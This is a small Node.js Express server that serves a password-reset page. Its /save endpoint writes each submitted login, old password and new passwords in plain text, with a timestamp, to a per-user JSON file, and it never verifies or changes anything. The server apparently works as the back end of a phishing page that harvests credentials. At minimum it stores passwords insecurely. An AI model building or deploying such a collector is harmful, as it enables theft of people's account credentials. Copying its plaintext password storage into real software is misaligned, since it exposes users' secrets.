const fs = require("fs");
const path = require("path");
const express = require("express");

const app = express();
app.use(express.json());

const usersDir = path.join(__dirname, "users");
if (!fs.existsSync(usersDir)) {
    fs.mkdirSync(usersDir);
}

// /page.html → /page
app.use((req, res, next) => {
    if (req.method === "GET" && req.path.endsWith(".html")) {
        const clean = req.path.slice(0, -5) || "/";
        return res.redirect(301, clean);
    }
    next();
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/reset-password", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "reset-password.html"));
});

app.use(express.static("public", { index: false }));

app.post("/save", (req, res) => {
    const { login, oldPassword, newPassword, newPassword2 } = req.body;

    const safeName = String(login || "unknown").replace(/[<>:"/\\|?*]/g, "_");
    const filePath = path.join(usersDir, `${safeName}.json`);

    const now = new Date();
    const date = now.toLocaleString("ru-RU", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
    });

    fs.writeFileSync(
        filePath,
        JSON.stringify({ login, oldPassword, newPassword, newPassword2, date }, null, 2)
    );

    res.json({ ok: true });
});

app.listen(3000, () => console.log("http://localhost:3000"));
